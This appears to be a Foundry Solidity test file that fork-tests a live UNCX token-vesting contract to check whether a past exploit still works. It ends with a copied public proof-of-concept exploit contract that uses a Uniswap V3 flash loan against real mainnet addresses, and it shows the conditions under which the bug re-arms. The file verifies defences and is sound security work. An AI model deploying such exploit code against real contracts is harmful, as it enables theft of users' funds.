// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {IVestingManager} from "../src/IVestingManager.sol";
import {MockERC20} from "../src/MockERC20.sol";

interface IERC20View {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

/// @title ZH4-PASS2 corrections reconciliation — UNCX `release()` / `cancel()` path
/// @notice Read-only fork tests. No mainnet transactions are signed or sent.
///         Question: can a FRESH attacker with no pre-existing vesting schedule extract value
///         from the live VestingManager at the latest block?
contract UncxReconcileTest is Test {
    IVestingManager constant VM = IVestingManager(0xA98F06312b7614523d0f5e725e15fd20fB1b99F5);
    IVestingManager constant BSC_VM = IVestingManager(0x7f3f9f4ED8987B78adC448a840169A0FD5AFFAAB);

    address constant VEK   = 0xb4fa28e9dBA552dF8a55579Bc9494f0F7486d215;
    address constant AXGT  = 0x6112C3509A8a787df576028450FebB3786A2274d;
    address constant AXGT2 = 0xDd66781D0E9a08D4FBb5eC7BAc80B691BE27F21D;
    address constant OXN   = 0x609e79A9fB9A71655B017f637A962B9962F4a9FC;
    address constant TCT   = 0xE9db0A36877dE86EfD134F87CAF3Db29f90b275c;

    address constant EDGEN = 0xAa9806c938836627Ed1a41Ae871c7E1889AE02Ca;
    address constant PEPE  = 0xA9E8aCf069C58aEc8825542845Fd754e41a9489A;
    address constant WFC   = 0x974733a3f37208647577bB925D8EE854c7337E29;

    address constant A = address(0xA11CE); // fresh attacker; no schedules, no roles
    address constant ATK_HELPER = 0xf6D072254Eb8A9B06e0bA21221b498332C1BC35E; // Oct-14 helper
    address constant ATTACKER_EOA = 0x78C9B11853E4f183a34C63fFd1924d2319a2f5B3;

    // live schedules used below (read at block 26,229,646; re-read on the fork)
    uint256 constant S_5040 = 5040; // recent legitimate release (Oct 17)
    uint256 constant S_5035 = 5035; // VEK, 250M, non-soft
    uint256 constant S_4963 = 4963; // OXN, positive pro-rata claim
    uint256 constant S_4972 = 4972; // soft + NFTized + transferable, positive claim
    uint256 constant S_5063 = 5063; // only live soft+topable on ETH; claim 0
    uint256 constant S_5030 = 5030; // soft EDGEN schedule in the corrupted pool

    uint256 constant SLOT_TOTAL_SHARES = 11;
    uint256 constant SLOT_FLAT_FEE = 17;

    function _rpc() internal view returns (string memory) {
        string memory u = vm.envOr("FORK_RPC_URL", string(""));
        if (bytes(u).length > 0) return u;
        u = vm.envOr("RPC_URL", string(""));
        if (bytes(u).length > 0) return u;
        return "https://ethereum-rpc.publicnode.com";
    }

    function _fork() internal returns (uint256 blk) {
        vm.createSelectFork(_rpc());
        blk = block.number;
        console2.log("fork block", blk);
        console2.log("fork timestamp", block.timestamp);
    }

    function _totalShares(address token) internal view returns (uint256) {
        return uint256(vm.load(address(VM), keccak256(abi.encode(token, SLOT_TOTAL_SHARES))));
    }

    function _tranche(uint256 t, uint256 amount) internal pure returns (IVestingManager.TimeAmount[] memory tr) {
        tr = new IVestingManager.TimeAmount[](2);
        tr[0] = IVestingManager.TimeAmount(t - 1000, 0, 0);
        tr[1] = IVestingManager.TimeAmount(t - 500, amount, 0);
    }

    function _schedule(uint256 id)
        internal
        view
        returns (address token, address creator, address beneficiary, bool soft, bool nft, bool cancelled, bool topable)
    {
        (token, creator, beneficiary, , , soft, nft, cancelled, topable, ) = VM.vestingSchedules(id);
    }

    // ---------------------------------------------------------------- A. live state / gate

    function test_A_liveParamsAndNonProxy() public {
        _fork();
        assertEq(VM.flatFee(), type(uint256).max, "flatFee must be uint256.max");
        assertEq(VM.feePercentage(), 500, "fee 5%");
        assertGe(VM.nextVestingId(), 5100, "nextVestingId >= 5100");
        // EIP-1967 implementation slot is zero -> not a proxy; no pause function exists in the ABI
        bytes32 impl = vm.load(address(VM), 0x360894a13BA1A3210667c828492Db98dcA3e2076cc3735a920a3ca505d382bbc);
        assertEq(uint256(impl), 0, "not a proxy");
        console2.log("flatFee", VM.flatFee());
        console2.log("nextVestingId", VM.nextVestingId());
        console2.log("owner", VM.owner());
    }

    function test_B_freshAttackerCreationBlocked() public {
        _fork();
        MockERC20 tok = new MockERC20();
        tok.mint(A, 1_000_000e18);
        vm.deal(A, 1_000_000 ether); // 1M ETH, still 10^71x short of uint256.max wei
        vm.prank(A);
        tok.approve(address(VM), type(uint256).max);
        IVestingManager.TimeAmount[] memory tr = _tranche(block.timestamp, 1_000e18);

        vm.prank(A);
        vm.expectRevert(abi.encodeWithSignature("InvalidFlatFee()"));
        VM.createVesting{value: 1_000_000 ether}(address(tok), tr, A, true, false, false, true);

        vm.prank(A);
        vm.expectRevert(abi.encodeWithSignature("InvalidFlatFee()"));
        VM.createDailySoftVesting{value: 1_000_000 ether}(address(tok), tr, A);

        address[] memory bens = new address[](2);
        bens[0] = A;
        bens[1] = A;
        vm.prank(A);
        vm.expectRevert(abi.encodeWithSignature("InvalidFlatFee()"));
        VM.createAirdropVesting{value: 1_000_000 ether}(address(tok), tr, bens, true, false, false, true);
    }

    // ---------------------------------------------------------------- B. release/cancel auth

    function test_C_releaseAndCancelAreRoleGated() public {
        _fork();
        uint256[4] memory ids = [S_5063, S_5035, S_4963, S_5040];
        for (uint256 i = 0; i < ids.length; i++) {
            (, address creator, address beneficiary, , , , ) = _schedule(ids[i]);
            assertTrue(creator != A && beneficiary != A, "attacker holds no role");
            vm.prank(A);
            vm.expectRevert(abi.encodeWithSignature("NotAuthorized()"));
            VM.release(ids[i]);
            vm.prank(A);
            vm.expectRevert(abi.encodeWithSignature("NotAuthorized()"));
            VM.cancel(ids[i]);
            vm.prank(A);
            vm.expectRevert(abi.encodeWithSignature("NotAuthorized()"));
            VM.transferVesting(ids[i], A);
        }
        // topUp on the only live soft+topable schedule also requires creator
        IVestingManager.TimeAmount[] memory tr = _tranche(block.timestamp + 10_000, 1e18);
        vm.prank(A);
        vm.expectRevert(abi.encodeWithSignature("NotAuthorized()"));
        VM.topUpVesting(S_5063, tr);
    }

    // ---------------------------------------------------------------- C. exact public PoC today

    function test_D_publicExploitRevertsAtFeeGate() public {
        _fork();
        DhlExploit atk = new DhlExploit();
        vm.deal(address(atk), 1 ether); // same as the public PoC's test
        vm.expectRevert(abi.encodeWithSignature("InvalidFlatFee()"));
        atk.attack();
    }

    // ---------------------------------------------------------------- D. NFT route gives release only

    function test_E_buyingNFTDoesNotGrantCancel() public {
        _fork();
        address owner = VM.ownerOf(S_4972);
        (, address creatorBefore, address benBefore, bool soft, bool nft, bool cancelled, ) = _schedule(S_4972);
        assertTrue(soft && nft && !cancelled, "fixture: soft+nftized");
        assertTrue(owner != A);
        assertEq(benBefore, owner, "beneficiary follows NFT owner");

        // simulate an attacker buying the transferable vesting NFT
        vm.prank(owner);
        VM.transferFrom(owner, A, S_4972);
        assertEq(VM.ownerOf(S_4972), A);
        (, address creatorAfter, address benAfter, , , , ) = _schedule(S_4972);
        assertEq(benAfter, A, "NFT transfer updates beneficiary");
        assertEq(creatorAfter, creatorBefore, "NFT transfer MUST NOT change creator");

        // release is now allowed, and pays exactly the pro-rata claim
        uint256 shares = VM._getReleasableShares(S_4972);
        assertGt(shares, 0);
        uint256 S = _totalShares(WFC);
        uint256 B = IERC20View(WFC).balanceOf(address(VM));
        uint256 expected = shares * B / S;
        uint256 before = IERC20View(WFC).balanceOf(A);
        vm.prank(A);
        VM.release(S_4972);
        assertEq(IERC20View(WFC).balanceOf(A) - before, expected, "release pays pro-rata only");

        // but cancel/topUp still require the ORIGINAL creator -> double-debit unreachable
        vm.prank(A);
        vm.expectRevert(abi.encodeWithSignature("NotAuthorized()"));
        VM.cancel(S_4972);
        IVestingManager.TimeAmount[] memory tr = _tranche(block.timestamp + 10_000, 1e18);
        vm.prank(A);
        vm.expectRevert(abi.encodeWithSignature("NotAuthorized()"));
        VM.topUpVesting(S_4972, tr);
        assertEq(creatorAfter, creatorBefore);
    }

    // ---------------------------------------------------------------- E. release is pro-rata (no premium)

    function test_F_releasePaysProRataAndCannotDoubleDip() public {
        _fork();
        (, , address ben, , , , ) = _schedule(S_4963);
        uint256 shares = VM._getReleasableShares(S_4963);
        uint256 S = _totalShares(OXN);
        uint256 B = IERC20View(OXN).balanceOf(address(VM));
        assertEq(S, B, "OXN pool is 1:1 (pass2's own observation)");
        uint256 expected = shares * B / S;
        uint256 before = IERC20View(OXN).balanceOf(ben);
        vm.prank(ben);
        VM.release(S_4963);
        assertEq(IERC20View(OXN).balanceOf(ben) - before, expected, "exact pro-rata, no premium");
        assertEq(VM._getReleasableShares(S_4963), 0, "no residual shares");
        vm.prank(ben);
        vm.expectRevert(abi.encodeWithSignature("NoTokensToRelease()"));
        VM.release(S_4963);
    }

    // ---------------------------------------------------------------- F. zero exemptions

    function test_G_noFeeExemptionsOnETH() public {
        _fork();
        assertFalse(VM.feeExemptCreators(0x037287a8844835e663c392d7f86eb2dBF2a14A98));
        assertFalse(VM.feeExemptCreators(0x7618283E4D27C1CdCA572B791B499e4DE9d9954A));
        assertFalse(VM.feeExemptCreators(0x648F3FD329b8c8a83e1D6cd069e1FdC619094285));
        assertFalse(VM.feeExemptTokens(VEK));
        assertFalse(VM.feeExemptTokens(AXGT));
        assertFalse(VM.feeExemptTokens(AXGT2));
        assertFalse(VM.feeExemptTokens(OXN));
        assertFalse(VM.feeExemptTokens(TCT));
        assertFalse(VM.feeExemptTokens(0x78069E97C5a1c4a92da4C577DBCfd86CFd83da53));
        assertFalse(VM.feeExemptTokens(EDGEN));
    }

    // ---------------------------------------------------------------- G. only the owner fee gate

    function test_H_feeZeroReArmsCreation() public {
        _fork();
        // simulate the only owner action that re-arms the immutable bug: flatFee -> 0
        vm.store(address(VM), bytes32(SLOT_FLAT_FEE), bytes32(uint256(0)));
        vm.store(address(VM), bytes32(uint256(16)), bytes32(uint256(0))); // feePercentage -> 0
        assertEq(VM.flatFee(), 0);
        assertEq(VM.feePercentage(), 0);
        MockERC20 tok = new MockERC20();
        tok.mint(A, 1_000_000e18);
        vm.prank(A);
        tok.approve(address(VM), type(uint256).max);
        IVestingManager.TimeAmount[] memory tr = _tranche(block.timestamp, 1_000e18);
        vm.prank(A);
        uint256 id = VM.createVesting(address(tok), tr, A, true, false, false, true);
        (address token, address creator, address ben, , , bool soft, , , bool topable, ) = VM.vestingSchedules(id);
        assertEq(token, address(tok));
        assertEq(creator, A);
        assertEq(ben, A);
        assertTrue(soft && topable);
        vm.prank(A);
        VM.release(id);
        vm.prank(A);
        VM.cancel(id);
        console2.log("conditional re-arm proven: create/release/cancel work with flatFee=0");
    }

    // ---------------------------------------------------------------- H. corrupted EDGEN claims revert

    function test_I_corruptedPoolClaimsAreNotRealizable() public {
        _fork();
        (, address creator, , , , , ) = _schedule(S_5030);
        uint256 B = IERC20View(EDGEN).balanceOf(address(VM));
        uint256 claim = VM.getReleasableAmount(S_5030);
        console2.log("EDGEN pool balance (wei)", B);
        console2.log("EDGEN nominal claim (wei)", claim);
        assertGt(claim, B, "claim exceeds pool -> not realizable");
        vm.prank(creator);
        vm.expectRevert(); // ERC20 insufficient balance
        VM.release(S_5030);
    }

    // ---------------------------------------------------------------- I. BSC mirror (optional)

    function test_J_bscManagerGate() public {
        string memory u = vm.envOr("BSC_RPC_URL", string(""));
        if (bytes(u).length == 0) {
            console2.log("BSC_RPC_URL unset - live BSC reads are in analysis/");
            return;
        }
        vm.createSelectFork(u);
        assertEq(BSC_VM.flatFee(), 35_000 ether, "BSC flatFee 35,000 BNB");
        assertEq(BSC_VM.feePercentage(), 500);
        vm.prank(A);
        vm.expectRevert(abi.encodeWithSignature("NotAuthorized()"));
        BSC_VM.release(641);
        vm.prank(A);
        vm.expectRevert(abi.encodeWithSignature("NotAuthorized()"));
        BSC_VM.cancel(641);
    }
}

// =====================================================================================
// Exact public DeFiHackLabs PoC (2026-10 UNCXSmartTokenVesting_exp.sol), copied so the
// current-state run is faithful. It is expected to revert at the first createVesting
// because 0.05 ETH < flatFee = uint256.max.
// =====================================================================================

interface IDhlErc20 {
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IDhlVesting {
    struct TimeAmount {
        uint256 time;
        uint256 amount;
        uint8 eqType;
    }

    function createVesting(
        address token,
        TimeAmount[] calldata tranches,
        address beneficiary,
        bool isSoft,
        bool isNftized,
        bool isTransferable,
        bool isTopable
    ) external payable returns (uint256);

    function topUpVesting(uint256 vestingId, TimeAmount[] calldata additionalTranches) external;
    function cancel(uint256 vestingId) external;
    function release(uint256 vestingId) external;
}

interface IDhlUniV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract DhlExploit {
    address internal constant VM = 0xA98F06312b7614523d0f5e725e15fd20fB1b99F5;
    address internal constant EDGEN = 0xAa9806c938836627Ed1a41Ae871c7E1889AE02Ca;
    address internal constant UNIV3_EDGEN = 0x4B2C930F88a87D1BfFaC291b6a7e01c9F13dD03e;
    uint256 internal constant EDGEN_BORROW = 131_769_607_356_179_331_729_743_626;
    uint256 internal constant FLAT_FEE = 0.05 ether;
    uint256 internal constant T1 = 1_791_992_997;
    uint256 internal constant T2 = 1_791_992_998;

    function attack() external {
        IDhlUniV3Pool(UNIV3_EDGEN).flash(address(this), EDGEN_BORROW, 0, "");
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        require(msg.sender == UNIV3_EDGEN, "bad v3 pool");
        IDhlErc20(EDGEN).approve(VM, type(uint256).max);
        IDhlVesting(VM).createVesting{value: FLAT_FEE}(
            EDGEN, _create(57_344_850_920_662_031_757_537), address(this), false, false, false, false
        );
        IDhlErc20(EDGEN).transfer(UNIV3_EDGEN, EDGEN_BORROW + fee0);
    }

    function _create(uint256 amount) internal pure returns (IDhlVesting.TimeAmount[] memory t) {
        t = new IDhlVesting.TimeAmount[](2);
        t[0] = IDhlVesting.TimeAmount(T1, 0, 0);
        t[1] = IDhlVesting.TimeAmount(T2, amount, 0);
    }

    receive() external payable {}
}
